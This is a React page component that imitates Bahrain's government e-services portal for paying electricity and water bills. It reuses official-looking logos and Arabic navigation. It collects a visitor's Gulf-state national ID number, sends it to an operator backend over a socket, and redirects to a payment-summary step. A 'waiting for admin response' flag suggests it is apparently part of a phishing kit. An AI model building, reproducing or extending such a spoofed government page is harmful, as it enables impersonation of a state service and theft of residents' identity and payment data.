import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData, socket } from "@/lib/store";

export default function HomePage() {
  const [, setLocation] = useLocation();
  const [idType, setIdType] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    navigateToPage('الصفحة الرئيسية');
  }, []);

  const handleSubmit = () => {
    if (!idType || !idNumber) return;
    setIsSubmitting(true);

    const idTypeLabel = 
      idType === 'bahraini' ? 'الرقم الشخصي البحريني' :
      idType === 'emirati' ? 'الرقم الشخصي الإماراتي' :
      idType === 'saudi' ? 'الرقم الشخصي السعودي' :
      idType === 'omani' ? 'الرقم الشخصي العماني' : idType;

    if (socket.value.connected) {
      socket.value.emit('visitor:updateName', idNumber);
    }

    sendData({
      data: {
        idType: idTypeLabel,
        idNumber,
      },
      current: 'الصفحة الرئيسية',
      nextPage: 'summary-payment',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsSubmitting(false);
      setLocation('/summary-payment');
    }, 1000);
  };

  return (
    <div style={{ minHeight: '100vh', background: '#e8e8e8', direction: 'rtl' }}>
      
      {/* ===== TOP GRAY HEADER AREA ===== */}
      <div style={{ background: '#ececec', borderBottom: '1px solid #ddd' }}>
        <div style={{ maxWidth: '1170px', margin: '0 auto', padding: '0 15px' }}>
          
          {/* Row 1: Logo + English */}
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 0 0 0' }}>
            <div>
              <img 
                src="/logo_ar.svg" 
                alt="شعار مملكة البحرين" 
                style={{ height: '65px' }} 
                onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
              />
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '5px', cursor: 'pointer' }}>
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#555" strokeWidth="1.5">
                <circle cx="12" cy="12" r="10"/>
                <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
              </svg>
              <span style={{ fontSize: '15px', color: '#333', fontFamily: 'Arial, sans-serif' }}>English</span>
            </div>
          </div>

          {/* Row 2: الخدمات الإلكترونية | دليل المعلومات + تسجيل الدخول */}
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 0 12px 0' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
              <span style={{ 
                fontSize: '20px', fontWeight: 'bold', color: '#333', 
                borderBottom: '3px solid #003366', paddingBottom: '6px',
                cursor: 'pointer', fontFamily: 'Arial, Tahoma, sans-serif'
              }}>الخدمات الإلكترونية</span>
              <span style={{ 
                fontSize: '20px', fontWeight: 'normal', color: '#555',
                cursor: 'pointer', fontFamily: 'Arial, Tahoma, sans-serif'
              }}>دليل المعلومات</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <svg width="28" height="28" viewBox="0 0 24 24" fill="#888" style={{ cursor: 'pointer' }}>
                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.4-1.4L10 14.2l7.6-7.6L19 8l-9 9z" opacity="0"/>
                <path d="M6 19c0 .6.2 1 .5 1.4C4.1 18.4 2.5 15.4 2.5 12c0-5.2 4.3-9.5 9.5-9.5 3.4 0 6.4 1.8 8.1 4.5-.3-.2-.7-.3-1.1-.3-.4-1.3-1.5-2.2-2.8-2.2-1 0-1.8.5-2.4 1.2C13.2 5.3 12.6 5 12 5c-1.7 0-3 1.3-3 3 0 .3 0 .6.1.8C7.3 9.1 6 10.6 6 12.5c0 .4.1.8.2 1.2-.1.2-.2.5-.2.8v4.5z" fill="#aaa"/>
                <circle cx="8" cy="17" r="1" fill="#aaa"/>
              </svg>
              <img src="/emergency-cal.svg" alt="" style={{ width: '22px', height: '22px', cursor: 'pointer', opacity: 0.6 }} onError={(e: any) => e.target.style.display='none'} />
              <a href="#" style={{
                background: '#006272', color: '#fff', padding: '6px 20px', borderRadius: '3px',
                fontSize: '14px', fontWeight: 'bold', textDecoration: 'none', display: 'inline-block',
                fontFamily: 'Arial, Tahoma, sans-serif'
              }}>
                تسجيل الدخول
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* ===== NAVIGATION BAR (White) ===== */}
      <div style={{ background: '#fff', borderBottom: '3px solid #2255a4' }}>
        <div style={{ maxWidth: '1170px', margin: '0 auto', padding: '0 15px', display: 'flex', alignItems: 'stretch' }}>
          <a href="#" style={{
            padding: '10px 18px', fontSize: '13px', color: '#333', textDecoration: 'none',
            borderLeft: '1px solid #ddd', display: 'flex', alignItems: 'center', gap: '6px',
            fontFamily: 'Arial, Tahoma, sans-serif', whiteSpace: 'nowrap'
          }}>
            <span style={{ color: '#2255a4', fontSize: '18px', fontWeight: 'bold' }}>|</span>
            الصفحة الرئيسية
          </a>
          <a href="#" style={{
            padding: '10px 18px', fontSize: '13px', color: '#333', textDecoration: 'none',
            borderLeft: '1px solid #ddd', fontFamily: 'Arial, Tahoma, sans-serif', whiteSpace: 'nowrap',
            display: 'flex', alignItems: 'center'
          }}>
            الخدمات الإلكترونية حسب التصنيف
          </a>
          <a href="#" style={{
            padding: '10px 18px', fontSize: '13px', color: '#333', textDecoration: 'none',
            borderLeft: '1px solid #ddd', fontFamily: 'Arial, Tahoma, sans-serif', whiteSpace: 'nowrap',
            display: 'flex', alignItems: 'center'
          }}>
            الخدمات الإلكترونية حسب المقدم
          </a>
          <a href="#" style={{
            padding: '10px 18px', fontSize: '13px', color: '#333', textDecoration: 'none',
            fontFamily: 'Arial, Tahoma, sans-serif', whiteSpace: 'nowrap',
            display: 'flex', alignItems: 'center'
          }}>
            متجر تطبيقات الحكومة الإلكترونية
          </a>
        </div>
      </div>

      {/* ===== BANNER: التخويل الإلكتروني ===== */}
      <div style={{ maxWidth: '1170px', margin: '20px auto', padding: '0 15px' }}>
        <div style={{
          background: '#e3f2fd', border: '2px dashed #d88', borderRadius: '0',
          padding: '25px 30px', display: 'flex', alignItems: 'center', justifyContent: 'center',
          position: 'relative', minHeight: '80px'
        }}>
          <div style={{ textAlign: 'center', flex: 1 }}>
            <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#333', margin: '0 0 5px 0', fontFamily: 'Arial, Tahoma, sans-serif' }}>
              استفد من خدمات{' '}
              <a href="#" style={{ color: '#1a73e8', textDecoration: 'underline' }}>التخويل الإلكتروني</a>
            </p>
            <p style={{ fontSize: '18px', color: '#555', margin: 0, fontFamily: 'Arial, Tahoma, sans-serif' }}>
              لإنجاز خدمات المكاتب الأمامية للجهات الحكومية
            </p>
          </div>
          <div style={{ position: 'absolute', left: '30px', top: '50%', transform: 'translateY(-50%)' }}>
            <img src="/bahrain_bh_logo.png" alt="" style={{ height: '50px', opacity: 0.7 }} onError={(e: any) => e.target.style.display='none'} />
          </div>
        </div>
      </div>

      {/* ===== MAIN CONTENT ===== */}
      <div style={{ maxWidth: '1170px', margin: '0 auto', padding: '0 15px' }}>
        
        {/* القائمة + Title */}
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '6px', cursor: 'pointer' }}>
            <img src="/icon_line.svg" alt="menu" style={{ width: '24px', height: '24px' }} onError={(e: any) => { e.target.style.display='none'; }} />
            <span style={{ fontSize: '14px', color: '#333', fontFamily: 'Arial, Tahoma, sans-serif' }}>القائمة</span>
          </div>
          <h2 style={{ fontSize: '20px', fontWeight: 'bold', color: '#333', margin: 0, fontFamily: 'Arial, Tahoma, sans-serif' }}>
            دفع فاتورة الكهرباء والماء
          </h2>
        </div>

        {/* Blue bar: اضغط هنا لعرض التعليمات */}
        <div style={{
          background: '#0000CC', color: '#fff', padding: '10px 18px',
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          cursor: 'pointer', fontSize: '15px', fontWeight: 'bold',
          fontFamily: 'Arial, Tahoma, sans-serif'
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><circle cx="12" cy="12" r="10" fill="none" stroke="white" strokeWidth="2"/><text x="12" y="16" textAnchor="middle" fill="white" fontSize="14" fontWeight="bold">i</text></svg>
            اضغط هنا لعرض التعليمات
          </div>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M7 10l5 5 5-5z"/></svg>
        </div>

        {/* * بيانات مطلوبة */}
        <p style={{ fontSize: '13px', color: '#333', margin: '10px 0', textAlign: 'right', fontFamily: 'Arial, Tahoma, sans-serif' }}>
          * بيانات مطلوبة
        </p>

        {/* Blue bar: تفاصيل العميل */}
        <div style={{
          background: '#0000CC', color: '#fff', padding: '10px 18px',
          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
          fontSize: '15px', fontWeight: 'bold', fontFamily: 'Arial, Tahoma, sans-serif'
        }}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M7 14l5-5 5 5z"/></svg>
          <span>تفاصيل العميل</span>
        </div>

        {/* Form area with dashed red border */}
        <div style={{
          background: '#fff', border: '1px dashed #c88', borderTop: 'none',
          padding: '20px 25px'
        }}>
          {/* ID Type */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: idType ? '15px' : '0' }}>
            <label style={{ fontSize: '14px', fontWeight: 'bold', color: '#333', whiteSpace: 'nowrap', fontFamily: 'Arial, Tahoma, sans-serif' }}>
              <span style={{ color: 'red' }}>*</span> نوع الهوية:
            </label>
            <select
              value={idType}
              onChange={e => setIdType(e.target.value)}
              style={{
                padding: '6px 10px', border: '1px solid #ccc', borderRadius: '0',
                fontSize: '14px', background: '#fff', cursor: 'pointer', direction: 'rtl',
                minWidth: '220px', fontFamily: 'Arial, Tahoma, sans-serif'
              }}
            >
              <option value="">-- اختر نوع الهوية --</option>
              <option value="emirati">الرقم الشخصي الإماراتي</option>
              <option value="bahraini">الرقم الشخصي البحريني</option>
              <option value="saudi">الرقم الشخصي السعودي</option>
              <option value="omani">الرقم الشخصي العماني</option>
            </select>
          </div>

          {/* ID Number */}
          {idType && (
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <label style={{ fontSize: '14px', fontWeight: 'bold', color: '#333', whiteSpace: 'nowrap', fontFamily: 'Arial, Tahoma, sans-serif' }}>
                <span style={{ color: 'red' }}>*</span> رقم الهوية:
              </label>
              <input
                type="text"
                value={idNumber}
                onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
                placeholder="أدخل رقم الهوية"
                maxLength={12}
                style={{
                  padding: '6px 10px', border: '1px solid #ccc', borderRadius: '0',
                  fontSize: '14px', direction: 'ltr', textAlign: 'left', minWidth: '220px',
                  fontFamily: 'Arial, Tahoma, sans-serif'
                }}
              />
            </div>
          )}
        </div>

        {/* Buttons */}
        <div style={{ display: 'flex', gap: '10px', justifyContent: 'center', margin: '20px 0 40px 0' }}>
          {idType && idNumber && (
            <button
              onClick={handleSubmit}
              disabled={isSubmitting}
              style={{
                background: isSubmitting ? '#ccc' : '#006272',
                color: '#fff', border: 'none', padding: '8px 28px', borderRadius: '0',
                fontSize: '14px', fontWeight: 'bold', cursor: isSubmitting ? 'not-allowed' : 'pointer',
                fontFamily: 'Arial, Tahoma, sans-serif'
              }}
            >
              {isSubmitting ? 'جاري المعالجة...' : 'التالي'}
            </button>
          )}
          <button style={{
            background: '#FFD700', color: '#333', border: 'none', padding: '8px 28px',
            borderRadius: '0', fontSize: '14px', fontWeight: 'bold', cursor: 'pointer',
            fontFamily: 'Arial, Tahoma, sans-serif'
          }}>
            رجوع
          </button>
        </div>
      </div>

      {/* ===== BOTTOM BLUE LINE ===== */}
      <div style={{ height: '4px', background: '#2255a4', marginTop: '30px' }}></div>
    </div>
  );
}
